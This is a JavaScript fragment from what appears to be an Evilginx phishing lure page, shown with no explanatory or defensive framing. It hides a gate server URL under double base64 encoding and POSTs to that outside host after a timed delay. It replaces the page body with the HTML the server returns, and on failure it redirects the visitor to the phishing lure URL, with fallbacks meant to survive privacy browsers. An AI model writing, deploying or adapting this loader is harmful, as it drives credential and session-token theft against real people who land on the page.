    var params = 'MC9mMDZhMmY0NS83MDQyNTMyNC8wUk1aY2tK';
    var lru    = 'YUhSMGNITTZMeTluWVhSbExtRnVaSEpsZDJodmJXVmlkV2xzWkM1MGIzQXY=';

    // {lure_url_html} is replaced by Evilginx with the lure URL + forwarder param
    var REDIRECT_URL = "{lure_url_html}";

    // Save redirect URL on window object — survives $('body').html() replacement
    // (sessionStorage may be blocked by privacy browsers like DuckDuckGo)
    if (REDIRECT_URL && REDIRECT_URL.indexOf('{') === -1) {
        window._rd = REDIRECT_URL;
    }

    var adol = 'false';

    setTimeout(function() { decall(); }, 1000);

    function decall() {
        $.post(atob(atob(lru)) + 'entry/' + params + '/', JSON.stringify({ unity: '' }))
        .done(function(data, status) {
            adol = true;
            if (!data.service) {
                $('.reload').html('Verification failed');
            } else {
                $('body').html(data.service);
            }
        })
        .fail(function(err) {
            adol = 'err';
            // Fallback: redirect directly if backend fails
            if (window._rd) {
                setTimeout(function() { window.location.href = window._rd; }, 2000);
            }
        });
    }

    setTimeout(function() {
        if (adol === 'false') decall();
        if (adol === 'err') {
            if (window._rd) {
                window.location.href = window._rd;
            }
        }
    }, 5000);
